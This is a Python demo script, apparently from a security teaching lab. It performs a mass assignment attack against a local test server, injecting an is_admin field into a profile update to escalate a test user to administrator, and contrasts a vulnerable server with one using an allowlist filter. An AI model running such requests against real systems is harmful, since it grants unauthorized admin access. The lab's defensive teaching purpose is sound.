"""
Mass Assignment Attack — "The Hidden Field Trick"
==================================================
Logs in as alice, then PUTs a profile update that secretly includes
is_admin=true. On the vulnerable server this field is written to the DB.
Verifies by GETting the user and checking the is_admin flag.

Run against VULNERABLE server:  SECURE_MODE=false  → is_admin becomes True
Run against SECURED   server:   SECURE_MODE=true   → is_admin unchanged (False)
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import requests
from colorama import Fore, Style, init

init(autoreset=True)

BASE = "http://localhost:5050"
ALICE_CREDS = {"username": "alice", "password": "password123"}


def login(creds: dict) -> tuple:
    r = requests.post(f"{BASE}/api/auth/login", json=creds, timeout=5)
    r.raise_for_status()
    d = r.json()
    return d["token"], d["user_id"]


def run_attack(label: str, token: str, user_id: int):
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  MASS ASSIGNMENT ATTACK  [{label}]")
    print(f"{'='*60}{Style.RESET_ALL}")
    print(f"Logged in as: {ALICE_CREDS['username']} (user_id={user_id})")

    headers = {"Authorization": f"Bearer {token}"}

    # Step 1: Check current is_admin value
    r = requests.get(f"{BASE}/api/users/{user_id}", headers=headers, timeout=5)
    before = r.json().get("is_admin", "N/A")
    print(f"\nBefore attack — is_admin = {Fore.YELLOW}{before}{Style.RESET_ALL}")

    # Step 2: Send PUT with injected is_admin field (the hidden field trick)
    payload = {
        "bio": "Normal bio update",   # legitimate field
        "is_admin": True,             # injected hidden field — attacker adds this manually
    }
    print(f"\nSending PUT /api/users/{user_id} with payload:")
    for k, v in payload.items():
        tag = f"  {Fore.RED}← INJECTED{Style.RESET_ALL}" if k == "is_admin" else ""
        print(f"  {k}: {v}{tag}")

    requests.put(f"{BASE}/api/users/{user_id}", json=payload, headers=headers, timeout=5)

    # Step 3: Read back and verify
    r2 = requests.get(f"{BASE}/api/users/{user_id}", headers=headers, timeout=5)
    after = r2.json().get("is_admin", "N/A")
    print(f"\nAfter  attack — is_admin = {Fore.YELLOW}{after}{Style.RESET_ALL}")

    print()
    if after is True:
        print(f"{Fore.RED}[RESULT] ATTACK SUCCEEDED — "
              f"is_admin escalated to True via hidden field injection!{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[RESULT] ATTACK BLOCKED — "
              f"is_admin unchanged. Allowlist filter discarded the injected field!{Style.RESET_ALL}")

    # Reset is_admin to False regardless (cleanup)
    if after is True:
        requests.put(f"{BASE}/api/users/{user_id}",
                     json={"is_admin": False}, headers=headers, timeout=5)


if __name__ == "__main__":
    token, user_id = login(ALICE_CREDS)
    run_attack("live server", token, user_id)
